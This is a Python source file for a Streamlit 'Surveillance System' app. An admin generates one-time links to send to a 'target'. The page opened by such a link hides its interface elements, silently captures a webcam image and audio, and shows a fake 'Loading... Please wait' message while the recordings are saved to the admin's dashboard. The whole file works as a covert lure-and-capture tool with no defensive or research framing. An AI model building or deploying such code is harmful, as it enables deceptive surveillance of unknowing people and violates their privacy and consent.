import streamlit as st
import cv2
import numpy as np
from datetime import datetime
import os
from audio_recorder_streamlit import audio_recorder
from utils import is_admin, require_admin, generate_capture_link
from storage import save_capture, get_all_captures

# Page config
st.set_page_config(
    page_title="Surveillance System",
    page_icon="🎥",
    layout="wide"
)

# Initialize session state
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False
if 'capture_links' not in st.session_state:
    st.session_state.capture_links = {}

def auto_capture_page(token):
    """Page for automatic capture when target opens the link"""
    if token not in st.session_state.capture_links:
        st.error("Invalid or expired link")
        return

    st.markdown("""
        <style>
        div.stButton > button:first-child { display: none; }
        </style>
    """, unsafe_allow_html=True)

    # Hidden capture elements
    img_capture = st.camera_input("", label_visibility="hidden")
    audio_bytes = audio_recorder(
        pause_threshold=2.0,
        sample_rate=41_000,
        text="",
        recording_color="#ff4b4b",
        neutral_color="#ffffff"
    )

    if img_capture is not None:
        # Save the captured image
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_capture(img_capture, audio_bytes, timestamp)

        # Remove used token
        del st.session_state.capture_links[token]

        # Show a loading message
        st.markdown("""
            <div style='text-align: center; font-size: 24px;'>
                Loading... Please wait
            </div>
        """, unsafe_allow_html=True)

def admin_login():
    """Admin login page"""
    st.title("Admin Login")

    username = st.text_input("Username")
    password = st.text_input("Password", type="password")

    if st.button("Login"):
        if is_admin(username, password):
            st.session_state.authenticated = True
            st.experimental_rerun()
        else:
            st.error("Invalid credentials")

@require_admin
def admin_dashboard():
    """Admin dashboard page"""
    st.title("Admin Dashboard")

    if st.button("Logout"):
        st.session_state.authenticated = False
        st.experimental_rerun()

    # Link generation section
    st.subheader("Generate Capture Link")
    if st.button("Generate New Link"):
        token = generate_capture_link()
        base_url = st.query_params.get("base_url", "http://localhost:5000")
        capture_url = f"{base_url}?token={token}"
        st.session_state.capture_links[token] = datetime.now()
        st.code(capture_url)
        st.info("Share this link with the target. The link will be valid until used.")

    # Display captures
    st.subheader("Captured Data")
    captures = get_all_captures()
    st.write(f"Total Captures: {len(captures)}")

    for capture in captures:
        with st.expander(f"Capture {capture['timestamp']}"):
            col1, col2 = st.columns(2)

            with col1:
                st.image(capture['image'], caption="Captured Image")

            with col2:
                if capture['audio']:
                    st.audio(capture['audio'], format="audio/wav")
                else:
                    st.write("No audio recorded")

                st.text(f"Timestamp: {capture['timestamp']}")

def main():
    # Check for capture token
    token = st.query_params.get("token")
    path = st.query_params.get("path")

    if token:
        auto_capture_page(token)
    elif path == "admin" or not path:  # Show admin page for both /admin and root URL
        if not st.session_state.authenticated:
            admin_login()
        else:
            admin_dashboard()

if __name__ == "__main__":
    main()